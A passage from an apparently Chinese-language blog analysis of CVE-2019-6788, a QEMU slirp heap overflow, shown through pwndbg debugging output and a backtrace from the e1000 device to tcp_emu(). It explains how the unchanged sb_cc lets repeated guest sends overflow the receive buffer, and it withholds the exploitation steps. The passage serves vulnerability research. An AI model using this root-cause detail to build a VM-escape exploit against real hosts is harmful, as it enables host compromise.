<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   633          struct socket *tmpso;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   634          struct sockaddr_in addr;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   635          socklen_t addrlen = sizeof(struct sockaddr_in);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   636          struct sbuf *so_rcv = &amp;so-&gt;so_rcv;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   637 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> ► 638          memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   639          so_rcv-&gt;sb_wptr += m-&gt;m_len;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   640          so_rcv-&gt;sb_rptr += m-&gt;m_len;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   641          m-&gt;m_data[m-&gt;m_len] = 0; /* NULL terminate */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   642          if (strchr(m-&gt;m_data, '\r') || strchr(m-&gt;m_data, '\n')) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   643              if (sscanf(so_rcv-&gt;sb_data, "%u%*[ ,]%u", &amp;n1, &amp;n2) == 2) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>pwndbg&gt; print *so_rcv
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>$6 = {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_cc = 0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_datalen = 8760, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_wptr = 0x7fffd2d29cc0 "H\b", 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_rptr = 0x7fffd2d29cc0 "H\b", 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_data = 0x7fffd2d29cc0 "H\b"
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>pwndbg&gt; x/16gx 0x7fffd2d29cc0
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29cc0: 0x00007fffd0000848  0x00007fffd3bdaff0
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29cd0: 0x00007fffd3bdaff0  0x00007fffd3bdaff0
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29ce0: 0x0000000000000000  0x0000000000000000
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29cf0: 0x0000000000000000  0x0000000000000000
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29d00: 0x0000000000000000  0x0000000000000000
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29d10: 0x0000000000000000  0x0000000000000000
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29d20: 0x0000000000000000  0x0000000000000000
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29d30: 0x0000000000000000  0x0000000000000000
</div></div></div></pre>
<p>拷贝完成之后，已经可以看到数据写入了</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   634          struct sockaddr_in addr;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   635          socklen_t addrlen = sizeof(struct sockaddr_in);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   636          struct sbuf *so_rcv = &amp;so-&gt;so_rcv;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   637 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   638          memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> ► 639          so_rcv-&gt;sb_wptr += m-&gt;m_len;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   640          so_rcv-&gt;sb_rptr += m-&gt;m_len;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   641          m-&gt;m_data[m-&gt;m_len] = 0; /* NULL terminate */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   642          if (strchr(m-&gt;m_data, '\r') || strchr(m-&gt;m_data, '\n')) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   643              if (sscanf(so_rcv-&gt;sb_data, "%u%*[ ,]%u", &amp;n1, &amp;n2) == 2) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   644                  HTONS(n1);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>pwndbg&gt; print *so_rcv
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>$7 = {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_cc = 0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_datalen = 8760, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_wptr = 0x7fffd2d29cc0 'A' &lt;repeats 200 times&gt;..., 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_rptr = 0x7fffd2d29cc0 'A' &lt;repeats 200 times&gt;..., 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_data = 0x7fffd2d29cc0 'A' &lt;repeats 200 times&gt;...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>pwndbg&gt; x/16gx 0x7fffd2d29cc0
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29cc0: 0x4141414141414141  0x4141414141414141
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29cd0: 0x4141414141414141  0x4141414141414141
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29ce0: 0x4141414141414141  0x4141414141414141
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29cf0: 0x4141414141414141  0x4141414141414141
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29d00: 0x4141414141414141  0x4141414141414141
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29d10: 0x4141414141414141  0x4141414141414141
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29d20: 0x4141414141414141  0x4141414141414141
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>0x7fffd2d29d30: 0x4141414141414141  0x4141414141414141
</div></div></div></pre>
<p>后面就是没有<code>\r</code>和<code>\n</code>，进不了if去修改<code>so_rcv-&gt;sb_cc</code>，单步一下毫无悬念的被跳过了</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   662                                                          so_rcv-&gt;sb_datalen,
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   663                                                          "%d,%d\r\n", n1, n2);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   664              so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   665              so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   666          }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> ► 667          m_free(m);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   668          return 0;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   669      }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   670 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   671         case EMU_FTP: /* ftp */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   672                 *(m-&gt;m_data+m-&gt;m_len) = 0; /* NUL terminate for strstr */
</div></div></div></pre>
<p>离开<code>tcp_emu()</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   937   default:
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   938      /* Ooops, not emulated, won't call tcp_emu again */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   939      so-&gt;so_emu = 0;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   940      return 1;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   941  }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> ► 942 }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   943 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   944 /*
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   945  * Do misc. config of SLiRP while its running.
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   946  * Return 0 if this connections is to be closed, 1 otherwise,
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   947  * return 2 if this is a command-line connection
</div></div></div></pre>
<p>回到<code>tcp_input()</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_input.c
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   578           *  he gets an ACK.
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   579           *
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   580           * It is better to not delay acks at all to maximize
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   581           * TCP throughput.  See RFC 2581.
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   582           */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> ► 583          tp-&gt;t_flags |= TF_ACKNOW;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   584          tcp_output(tp);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   585          return;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   586      }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   587  } /* header prediction */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   588  /*
</div></div></div></pre>
<p>函数<code>tcp_input()</code>挺大的，我们看关键的判断点，因为<code>so_rcv-&gt;sb_cc</code>没有被更新，所以可以继续写入数据</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>} else if (ti-&gt;ti_ack == tp-&gt;snd_una 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    &amp;&amp; tcpfrag_list_empty(tp) 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    &amp;&amp; ti-&gt;ti_len &lt;= sbspace(&amp;so-&gt;so_rcv)) {
</div></div></div></pre>
<p>我们的Poc是循环发送数据，刚才走完了第一轮，接下来进行第二轮</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   607  *
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   608  * NOTE: if you return 0 you MUST m_free() the mbuf!
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   609  */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   610 int
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   611 tcp_emu(struct socket *so, struct mbuf *m)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> ► 612 {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   613  Slirp *slirp = so-&gt;slirp;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   614  u_int n1, n2, n3, n4, n5, n6;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   615         char buff[257];
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   616  uint32_t laddr;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   617  u_int lport;
</div></div></div></pre>
<p>我们来看<code>so-&gt;so_rcv</code>，此时的<code>sb_wptr</code>和<code>sb_rptr</code>已经指向的是添加了第一轮数据之后的位置，但是<code>sb_cc</code>却没有更新，那么如果我们一直发数据，就会一直写，并且等于没有长度校验，最终就会溢出</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>pwndbg&gt; print so-&gt;so_rcv
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>$9 = {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_cc = 0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_datalen = 8760, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_wptr = 0x7fffd2d2a1c0 "", 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_rptr = 0x7fffd2d2a1c0 "", 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  sb_data = 0x7fffd2d29cc0 'A' &lt;repeats 200 times&gt;...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>利用过程不贴了</p>
<p>我觉得最关键的不是上面这些分析，常规的分析到这里一般也就结束了，最多再放一个帅气的计算器</p>
<p>但是我额外思考了一些东西：Debian在运行Poc的时候，通过与虚拟网卡交互发送数据到宿主机这个过程，内部的细节是怎样的？</p>
<p>我昨晚到现在看了不少关于这部分的资料，各类资料都比较乱，这里简单列一下</p>
<p>《QEMU虚拟网络E1000源代码分析》</p>
<ul>
<li><a href="http://oenhan.com/qemu-virtual-network-e1000">http://oenhan.com/qemu-virtual-network-e1000</a></li>
</ul>
<p>《qemu网络虚拟化之数据流向分析一》</p>
<ul>
<li><a href="https://www.cnblogs.com/ck1020/p/5910378.html">https://www.cnblogs.com/ck1020/p/5910378.html</a></li>
</ul>
<p>《qemu网络虚拟化之数据流向分析二》</p>
<ul>
<li><a href="https://www.cnblogs.com/ck1020/p/5913906.html">https://www.cnblogs.com/ck1020/p/5913906.html</a></li>
</ul>
<p>《qemu网络虚拟化之数据流向分析三》</p>
<ul>
<li><a href="https://www.cnblogs.com/ck1020/p/5914232.html">https://www.cnblogs.com/ck1020/p/5914232.html</a></li>
</ul>
<p>《虚拟网卡 TUN/TAP 驱动程序设计原理》</p>
<ul>
<li><a href="https://www.ibm.com/developerworks/cn/linux/l-tuntap/">https://www.ibm.com/developerworks/cn/linux/l-tuntap/</a></li>
</ul>
<p>《TUN/TAP设备浅析(一) -- 原理浅析》</p>
<ul>
<li><a href="https://www.jianshu.com/p/09f9375b7fa7">https://www.jianshu.com/p/09f9375b7fa7</a></li>
</ul>
<p>这些资料有兴趣的同学可以看看，我也没有掌握的多深入，就不在这里瞎写了</p>
<p>如同大佬所说，其安全性值得研究，对于我来说，在研究它的安全性之前，先多看看这些分析QEMU内部原理的文章理解流程</p>
<p><img src="resources/799491EBFE69F256E3A93A77788D5EA3.jpg" alt="IMAGE" width="693" height="104"></p>
<p>带着疑问，继续深入研究一下细节，以下的记录不一定对，大家酌情阅读，如果有大佬发现错误，还请不吝赐教</p>
<p>在函数<code>tcp_emu()</code>断下后，打印出整个调用栈</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>pwndbg&gt; bt
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#0  tcp_emu (so=0x7fffd289e850, m=0x7fffd2527000) at /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c:612
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#1  0x0000555555c10a2f in tcp_input (m=0x7fffd2527000, iphlen=20, inso=0x0, af=2) at /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_input.c:571
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#2  0x0000555555c077e5 in ip_input (m=0x7fffd2527000) at /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/ip_input.c:206
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#3  0x0000555555c0ac85 in slirp_input (slirp=0x55555682dfc0, pkt=0x7fffd4a7fcc0 "RU\n", pkt_len=1334) at /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/slirp.c:876
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#4  0x0000555555bf2f80 in net_slirp_receive (nc=0x555556829c70, buf=0x7fffd4a7fcc0 "RU\n", size=1334) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/slirp.c:113
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#5  0x0000555555be8a36 in nc_sendv_compat (nc=0x555556829c70, iov=0x7fffd547ef40, iovcnt=1, flags=0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:706
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#6  0x0000555555be8af8 in qemu_deliver_packet_iov (sender=0x555556829630, flags=0, iov=0x7fffd547ef40, iovcnt=1, opaque=0x555556829c70) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:734
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#7  0x0000555555beb5d5 in qemu_net_queue_deliver_iov (queue=0x555556829e60, sender=0x555556829630, flags=0, iov=0x7fffd547ef40, iovcnt=1) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/queue.c:179
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#8  0x0000555555beb744 in qemu_net_queue_send_iov (queue=0x555556829e60, sender=0x555556829630, flags=0, iov=0x7fffd547ef40, iovcnt=1, sent_cb=0x0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/queue.c:224
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#9  0x0000555555be8c3d in qemu_sendv_packet_async (sender=0x555556829630, iov=0x7fffd547ef40, iovcnt=1, sent_cb=0x0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:775
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#10 0x0000555555be8c6a in qemu_sendv_packet (nc=0x555556829630, iov=0x7fffd547ef40, iovcnt=1) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:783
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#11 0x0000555555bec16b in net_hub_receive_iov (hub=0x555556829410, source_port=0x555556829990, iov=0x7fffd547ef40, iovcnt=1) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/hub.c:74
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#12 0x0000555555bec365 in net_hub_port_receive_iov (nc=0x555556829990, iov=0x7fffd547ef40, iovcnt=1) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/hub.c:125
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#13 0x0000555555be8add in qemu_deliver_packet_iov (sender=0x5555576ac360, flags=0, iov=0x7fffd547ef40, iovcnt=1, opaque=0x555556829990) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:732
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#14 0x0000555555beb559 in qemu_net_queue_deliver (queue=0x555556829b30, sender=0x5555576ac360, flags=0, data=0x7fffd4a7fcc0 "RU\n", size=1334) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/queue.c:164
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#15 0x0000555555beb675 in qemu_net_queue_send (queue=0x555556829b30, sender=0x5555576ac360, flags=0, data=0x7fffd4a7fcc0 "RU\n", size=1334, sent_cb=0x0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/queue.c:19
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#16 0x0000555555be889d in qemu_send_packet_async_with_flags (sender=0x5555576ac360, flags=0, buf=0x7fffd4a7fcc0 "RU\n", size=1334, sent_cb=0x0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:660
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#17 0x0000555555be88d5 in qemu_send_packet_async (sender=0x5555576ac360, buf=0x7fffd4a7fcc0 "RU\n", size=1334, sent_cb=0x0) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:667
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#18 0x0000555555be8902 in qemu_send_packet (nc=0x5555576ac360, buf=0x7fffd4a7fcc0 "RU\n", size=1334) at /home/wnagzihxa1n/CVE-2019-6788/qemu/net/net.c:673
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#19 0x0000555555adf75f in e1000_send_packet (s=0x7fffd4a5d010, buf=0x7fffd4a7fcc0 "RU\n", size=1334) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:538
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#20 0x0000555555adfbc9 in xmit_seg (s=0x7fffd4a5d010) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:601
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#21 0x0000555555ae00f8 in process_tx_desc (s=0x7fffd4a5d010, dp=0x7fffd547f180) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:688
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#22 0x0000555555ae02f0 in start_xmit (s=0x7fffd4a5d010) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:743
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#23 0x0000555555ae1388 in set_tctl (s=0x7fffd4a5d010, index=3590, val=26) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:1111
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#24 0x0000555555ae1505 in e1000_mmio_write (opaque=0x7fffd4a5d010, addr=14360, val=26, size=4) at /home/wnagzihxa1n/CVE-2019-6788/qemu/hw/net/e1000.c:1287
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#25 0x0000555555860c39 in memory_region_write_accessor (mr=0x7fffd4a5f910, addr=14360, value=0x7fffd547f2e8, size=4, shift=0, mask=4294967295, attrs=...) at /home/wnagzihxa1n/CVE-2019-6788/qemu/memory.c:504
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#26 0x0000555555860e4c in access_with_adjusted_size (addr=14360, value=0x7fffd547f2e8, size=4, access_size_min=4, access_size_max=4, access_fn=0x555555860b50 &lt;memory_region_write_accessor&gt;, mr=0x7fffd4a5f910
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#27 0x0000555555863a9b in memory_region_dispatch_write (mr=0x7fffd4a5f910, addr=14360, data=26, size=4, attrs=...) at /home/wnagzihxa1n/CVE-2019-6788/qemu/memory.c:1452
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#28 0x0000555555883fc0 in io_writex (env=0x55555684c6d0, iotlbentry=0x5555568563a0, mmu_idx=2, val=26, addr=18446649392234641432, retaddr=140736821593602, recheck=false, size=4) at /home/wnagzihxa1n/CVE-2015
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#29 0x0000555555886016 in io_writel (env=0x55555684c6d0, mmu_idx=2, index=35, val=26, addr=18446649392234641432, retaddr=140736821593602, recheck=false) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tcg/sof3
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#30 0x00005555558861d7 in helper_le_stl_mmu (env=0x55555684c6d0, addr=18446649392234641432, val=26, oi=34, retaddr=140736821593602) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tcg/softmmu_template.h:310
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#31 0x00007fffd8420602 in code_gen_buffer ()
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#32 0x00005555558a13f1 in cpu_tb_exec (cpu=0x555556844420, itb=0x7fffd841fb00 &lt;code_gen_buffer+41540307&gt;) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tcg/cpu-exec.c:171
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#33 0x00005555558a22be in cpu_loop_exec_tb (cpu=0x555556844420, tb=0x7fffd841fb00 &lt;code_gen_buffer+41540307&gt;, last_tb=0x7fffd547fa18, tb_exit=0x7fffd547fa10) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tc5
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#34 0x00005555558a25ba in cpu_exec (cpu=0x555556844420) at /home/wnagzihxa1n/CVE-2019-6788/qemu/accel/tcg/cpu-exec.c:725
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#35 0x0000555555845fd2 in tcg_cpu_exec (cpu=0x555556844420) at /home/wnagzihxa1n/CVE-2019-6788/qemu/cpus.c:1429
